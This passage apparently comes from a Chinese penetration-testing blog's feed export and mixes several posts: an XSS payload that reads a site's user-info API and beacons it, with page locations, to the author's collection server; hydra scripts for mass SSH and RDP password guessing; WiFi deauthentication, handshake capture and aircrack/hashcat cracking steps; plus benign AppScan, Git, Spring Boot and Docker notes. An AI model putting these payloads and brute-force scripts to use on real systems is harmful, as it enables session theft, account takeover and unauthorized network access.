class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function get(url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var req = new XMLHttpRequest();</span><br><span class="line">        req.open(&#x27;GET&#x27;, url, false);</span><br><span class="line">        req.send(null);</span><br><span class="line">        if(req.status == 200)</span><br><span class="line">            return req.responseText;</span><br><span class="line">    &#125; catch(err) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line">var role = get(&#x27;https://www.xxxxxx.com/im/api/myinfo&#x27;);</span><br><span class="line"></span><br><span class="line">(function()&#123;(new Image()).src=&#x27;https://我的站点/index.php?do=api&amp;id=Q7yYOv&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return role&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();</span><br><span class="line">if(&#x27;&#x27;==1)&#123;keep=new Image();keep.src=&#x27;https://我的站点/index.php?do=keepsession&amp;id=Q7yYOv&amp;url=&#x27;+escape(document.location)+&#x27;&amp;cookie=&#x27;+escape(role)&#125;;</span><br><span class="line"></span><br><span class="line">alert(role)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网渗透 </category>
          
          <category> 漏洞利用 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>appscan登录扫描-手工探索扫描</title>
      <link href="/2025/03/10/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F/"/>
      <url>/2025/03/10/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="新建扫描-常规扫描"><a href="#新建扫描-常规扫描" class="headerlink" title="新建扫描-常规扫描"></a>新建扫描-常规扫描</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215222232.png" alt="image-20250310215222232"></p><h2 id="本机浏览器代理抓链接"><a href="#本机浏览器代理抓链接" class="headerlink" title="本机浏览器代理抓链接"></a>本机浏览器代理抓链接</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215246078.png" alt="image-20250310215246078"></p><h2 id="记录访问"><a href="#记录访问" class="headerlink" title="记录访问"></a>记录访问</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215301380.png" alt="image-20250310215301380"></p><h2 id="开启代理，进行登录后的链接抓取"><a href="#开启代理，进行登录后的链接抓取" class="headerlink" title="开启代理，进行登录后的链接抓取"></a>开启代理，进行登录后的链接抓取</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215324793.png" alt="image-20250310215324793"></p><h2 id="筛选目标链接"><a href="#筛选目标链接" class="headerlink" title="筛选目标链接"></a>筛选目标链接</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215336590.png" alt="image-20250310215336590"></p><h2 id="删除多余链接"><a href="#删除多余链接" class="headerlink" title="删除多余链接"></a>删除多余链接</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215351907.png" alt="image-20250310215351907"></p><h2 id="开始抓取链接"><a href="#开始抓取链接" class="headerlink" title="开始抓取链接"></a>开始抓取链接</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215403453.png" alt="image-20250310215403453"></p><h2 id="多点击链接，手动探索，获取扫描对象"><a href="#多点击链接，手动探索，获取扫描对象" class="headerlink" title="多点击链接，手动探索，获取扫描对象"></a>多点击链接，手动探索，获取扫描对象</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215415989.png" alt="image-20250310215415989"></p><h2 id="冗余调整后-开始仅测试"><a href="#冗余调整后-开始仅测试" class="headerlink" title="冗余调整后-开始仅测试"></a>冗余调整后-开始仅测试</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215429185.png" alt="image-20250310215429185"></p><h2 id="扫描-仅测试"><a href="#扫描-仅测试" class="headerlink" title="扫描-仅测试"></a>扫描-仅测试</h2><p><img src="/images/appscan%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F-%E6%89%8B%E5%B7%A5%E6%8E%A2%E7%B4%A2%E6%89%AB%E6%8F%8F.assets/image-20250310215443317.png" alt="image-20250310215443317"></p>]]></content>
      
      
      <categories>
          
          <category> 外网渗透 </category>
          
          <category> TOOLS </category>
          
          <category> 扫描 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> appscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hydra爆破</title>
      <link href="/2025/03/10/hydra%E7%88%86%E7%A0%B4/"/>
      <url>/2025/03/10/hydra%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure><h2 id="扫描开放端口"><a href="#扫描开放端口" class="headerlink" title="扫描开放端口"></a>扫描开放端口</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS --open -p3389 172.20.0.0/16 |grep -E -o &#x27;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&#x27; &gt;&gt;172.20-3389.txt    </span><br></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#/bin/bash -</span><br><span class="line">cat ip |while read line</span><br><span class="line">do</span><br><span class="line">  echo $line</span><br><span class="line">nmap -sS --open -p22 $line |grep -E -o &#x27;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&#x27; &gt;&gt;22-port.txt</span><br><span class="line">nmap -sS --open -p3389 $line |grep -E -o &#x27;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&#x27; &gt;&gt;3389-port.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="简单运行"><a href="#简单运行" class="headerlink" title="简单运行"></a>简单运行</h2><p>pass&#x2F;p4.txt最好少于10个，防止登录锁定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass/p4.txt -M 3389.txt -t 3 -vV -W 15 rdp -o /m-result.txt</span><br><span class="line"></span><br><span class="line">hydra -l administrator -P pass/dic_password.txt -s 4489 -t 1 -vV 192.168.90.240 rdp</span><br></pre></td></tr></table></figure><h2 id="hydra-port-sh执行爆破"><a href="#hydra-port-sh执行爆破" class="headerlink" title="hydra-port.sh执行爆破"></a>hydra-port.sh执行爆破</h2><p>这里线程5，太多会中断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">starttime=`date +&#x27;%Y-%m-%d %H:%M:%S&#x27;`</span><br><span class="line">DATE=`date +%F | sed &#x27;s/-//g&#x27;``date +%T | sed &#x27;s/://g&#x27;`</span><br><span class="line"></span><br><span class="line">cat 22-port.txt | while read line</span><br><span class="line">do </span><br><span class="line">    echo &quot;Current Task: $&#123;line&#125;&quot;</span><br><span class="line">    hydra -L user.txt -P passwd.txt -t 5 -vV $line ssh | grep &quot;host:&quot; &gt;&gt;$DATE-success.txt</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">endtime=`date +&#x27;%Y-%m-%d %H:%M:%S&#x27;`</span><br><span class="line">start_seconds=$(date --date=&quot;$starttime&quot; +%s);</span><br><span class="line">end_seconds=$(date --date=&quot;$endtime&quot; +%s);</span><br><span class="line">echo &quot; This time scanned in&quot; $((end_seconds-start_seconds))&quot;s&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;-------password guessing finished-------&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 密码攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WIFI爆破</title>
      <link href="/2025/03/10/wifi%E7%88%86%E7%A0%B4/"/>
      <url>/2025/03/10/wifi%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-无线网卡"><a href="#kali-无线网卡" class="headerlink" title="kali+无线网卡"></a>kali+无线网卡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><h3 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#出现标识EAPOL即可，即有人连接wifi</span><br><span class="line">airodump-ng -c 5 --bssid 08:40:F3:5F:A4:54 -w capture/ wlan0mon     </span><br></pre></td></tr></table></figure><h3 id="或者强制剔除连接"><a href="#或者强制剔除连接" class="headerlink" title="或者强制剔除连接"></a>或者强制剔除连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 08:40:F3:5F:A4:54 -c 64:BC:0C:48:97:F7 wlan0mon</span><br></pre></td></tr></table></figure><h3 id="aircrack-ng爆破-主机速度3000-s"><a href="#aircrack-ng爆破-主机速度3000-s" class="headerlink" title="aircrack-ng爆破,主机速度3000&#x2F;s"></a>aircrack-ng爆破,主机速度3000&#x2F;s</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b 08:40:F3:5F:A4:54 -w /tmp/pass.txt capture/-04.cap</span><br></pre></td></tr></table></figure><h2 id="hashcat爆破："><a href="#hashcat爆破：" class="headerlink" title="hashcat爆破："></a>hashcat爆破：</h2><p>6.11比6.26快，6.26不支持.hccapx，需要.hc22000</p><p>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">–potfile-disable：不在 potfile 中记录破解成功的 hash</span><br><span class="line">-o log.txt：成功爆破输出文件</span><br><span class="line">-D 2：使用GPU</span><br><span class="line">--show:显示已经破解的密码</span><br></pre></td></tr></table></figure><h3 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h3><p>在线转码, 使用 hashcat 官网提供的在线工具进行格式转换.hc22000：<br><a href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 22000 D:\桌面\-10.hc22000 D:\桌面\passworddic\pass.txt</span><br></pre></td></tr></table></figure><h3 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h3><p>本地工具转码，hashcat-utils-1.9</p><p>下载地址：<a href="https://github.com/hashcat/hashcat-utils/releases">https://github.com/hashcat/hashcat-utils/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cap2hccapx.exe D:\桌面\-04.cap D:\桌面\-04.hccapx</span><br><span class="line">hashcat -m 2500 D:\桌面\-04.hccapx D:\桌面\passworddic\pass.txt</span><br></pre></td></tr></table></figure><h3 id="本机Windows："><a href="#本机Windows：" class="headerlink" title="本机Windows："></a>本机Windows：</h3><p>hashcat -b 基准测试六万左右</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashmode: 22000 - WPA-PBKDF2-PMKID+EAPOL (Iterations: 4095)</span><br><span class="line">Speed.#1.........:    60600 H/s (50.41ms) @ Accel:8 Loops:512 Thr:1024 Vec:1</span><br></pre></td></tr></table></figure><p>windows 实际速度 55256 H&#x2F;s，成功密码保存在hashcat.potfile，需要清除再跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 2500 D:\桌面\-04.hccapx D:\桌面\passworddic\pass.txt</span><br><span class="line">hashcat -a 3 -m 2500 D:\桌面\-10.hccapx 151774d?d?d?d?d –potfile-disable </span><br><span class="line">hashcat -a 3 -m 2500 D:\桌面\-10.hccapx 151774d?d?d?d?d -show</span><br></pre></td></tr></table></figure><h3 id="虚拟机linux"><a href="#虚拟机linux" class="headerlink" title="虚拟机linux :"></a>虚拟机linux :</h3><p>速度 2815 H&#x2F;s，内存改为4G</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 22000 ./-10.hc22000 ./top_1000000.txt</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/wutou/p/17682334.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网渗透 </category>
          
          <category> 密码攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git命令</title>
      <link href="/2025/03/09/Git%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/03/09/Git%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="初始"><a href="#初始" class="headerlink" title="初始"></a>初始</h1><h2 id="1-初始化Git仓库"><a href="#1-初始化Git仓库" class="headerlink" title="1. 初始化Git仓库"></a>1. 初始化Git仓库</h2><p>首先，确保你的Spring Boot项目已经被初始化为一个Git仓库。你可以在你的项目根目录下运行以下命令来初始化Git仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure><h3 id="2-配置Git用户信息"><a href="#2-配置Git用户信息" class="headerlink" title="2. 配置Git用户信息"></a>2. 配置Git用户信息</h3><p>在提交代码到Git仓库之前，你需要配置你的用户信息。运行以下命令来设置你的用户名和邮箱：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --local user.name &quot;Administrator&quot;</span><br><span class="line">git config --local user.email &quot;gitlab_admin_a67709@example.com&quot;</span><br></pre></td></tr></table></figure><h3 id="3-添加文件到Git并提交"><a href="#3-添加文件到Git并提交" class="headerlink" title="3. 添加文件到Git并提交"></a>3. 添加文件到Git并提交</h3><p>将你的Spring Boot项目文件添加到Git仓库，并提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .git commit -m &quot;Initial commit&quot; </span><br></pre></td></tr></table></figure><h3 id="4-将本地仓库与远程仓库关联"><a href="#4-将本地仓库与远程仓库关联" class="headerlink" title="4. 将本地仓库与远程仓库关联"></a>4. 将本地仓库与远程仓库关联</h3><p>如果你已经有一个远程的Git仓库（例如在GitHub、GitLab或Bitbucket上），你可以将你的本地仓库与这个远程仓库关联起来。首先，你需要获取远程仓库的URL。然后，使用以下命令关联远程仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin  </span><br></pre></td></tr></table></figure><p>例如，如果你的仓库URL是<a href="http://192.168.128.151:8089/root/mytest.git%EF%BC%8C%E5%88%99%E5%91%BD%E4%BB%A4%E4%B8%BA%EF%BC%9A">http://192.168.128.151:8089/root/mytest.git，则命令为：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin http://192.168.128.151:8089/root/mytest.git </span><br></pre></td></tr></table></figure><p>检查远程仓库，这将列出所有远程仓库及其URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v </span><br></pre></td></tr></table></figure><h3 id="5-推送到远程仓库"><a href="#5-推送到远程仓库" class="headerlink" title="5. 推送到远程仓库"></a>5. 推送到远程仓库</h3><p>将你的代码推送到远程仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h1 id="更新推送"><a href="#更新推送" class="headerlink" title="更新推送"></a>更新推送</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin http://192.168.128.151:8089/root/mytest.git</span><br><span class="line">git add .# 添加解决后的文件到暂存区</span><br><span class="line">git commit -m &quot;my 44444 commit&quot;# 提交解决后的更改</span><br><span class="line">git push -u origin master#推送更改</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> Git命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-Tool-Suite创建spring-boot项目</title>
      <link href="/2025/03/09/Spring%20Tool%20Suite%E5%88%9B%E5%BB%BAspring%20boot%E9%A1%B9%E7%9B%AE/"/>
      <url>/2025/03/09/Spring%20Tool%20Suite%E5%88%9B%E5%BB%BAspring%20boot%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="首先创建maven项目"><a href="#首先创建maven项目" class="headerlink" title="首先创建maven项目"></a>首先创建maven项目</h1><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215145147288.png" alt="image-20250215145147288"></p><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215145241774.png" alt="image-20250215145241774"></p><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215150149057.png" alt="image-20250215150149057"></p><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215150218716.png" alt="image-20250215150218716"></p><h2 id="转换spring-boot项目"><a href="#转换spring-boot项目" class="headerlink" title="转换spring-boot项目"></a>转换spring-boot项目</h2><h3 id="创建控制器package"><a href="#创建控制器package" class="headerlink" title="创建控制器package"></a>创建控制器package</h3><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215150604333.png" alt="image-20250215150604333"></p><h3 id="创建控制器类"><a href="#创建控制器类" class="headerlink" title="创建控制器类"></a>创建控制器类</h3><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215150721777.png" alt="image-20250215150721777"></p><h3 id="修改测试代码"><a href="#修改测试代码" class="headerlink" title="修改测试代码"></a>修改测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package example.mytest.contraller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    @GetMapping(&quot;/test&quot;)</span><br><span class="line">    public String test() &#123;</span><br><span class="line">        return &quot;Hello Jenkddd5555dins!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改App-java，用于运行web"><a href="#修改App-java，用于运行web" class="headerlink" title="修改App.java，用于运行web"></a>修改App.java，用于运行web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">public class App &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(App.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建资源目录"><a href="#创建资源目录" class="headerlink" title="创建资源目录"></a>创建资源目录</h3><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215152021254.png" alt="image-20250215152021254"></p><h3 id="再创建application-properties"><a href="#再创建application-properties" class="headerlink" title="再创建application.properties"></a>再创建application.properties</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring.application.name=test</span><br><span class="line">server.port=8080</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215152114371.png" alt="image-20250215152114371"></p><h3 id="修改pom-xml"><a href="#修改pom-xml" class="headerlink" title="修改pom.xml"></a>修改pom.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">       &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;3.0.5&lt;/version&gt;</span><br><span class="line">       &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">   &lt;/parent&gt;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">           &lt;scope&gt;mytest&lt;/scope&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line">       </span><br><span class="line">   </span><br></pre></td></tr></table></figure><h3 id="pom-xml右键maven-install"><a href="#pom-xml右键maven-install" class="headerlink" title="pom.xml右键maven install"></a>pom.xml右键maven install</h3><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215152701904.png" alt="image-20250215152701904"></p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215152729247.png" alt="image-20250215152729247"></p><p><img src="/images/Spring-Tool-Suite%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE.assets/image-20250215164834492.png" alt="image-20250215164834492"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> 创建实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring boot </tag>
            
            <tag> maven </tag>
            
            <tag> CI/CD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker gitlab</title>
      <link href="/2025/03/09/centos-docker-gitlab/"/>
      <url>/2025/03/09/centos-docker-gitlab/</url>
      
        <content type="html"><![CDATA[<h1 id="CI-CD（1）"><a href="#CI-CD（1）" class="headerlink" title="CI&#x2F;CD（1）"></a>CI&#x2F;CD（1）</h1><h1 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h1><h2 id="一、安装前准备"><a href="#一、安装前准备" class="headerlink" title="一、安装前准备"></a>一、安装前准备</h2><p>在安装Docker与Docker-Compose之前，需要先卸载CentOS上可能已经安装的旧版本的Docker。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker docker-common docker-selinux docker-engine</span><br></pre></td></tr></table></figure><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><h3 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h3><p>在安装Docker之前，需要先安装一些依赖包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213164650474.png" alt="image-20250213164650474"></p><h3 id="换Docker源"><a href="#换Docker源" 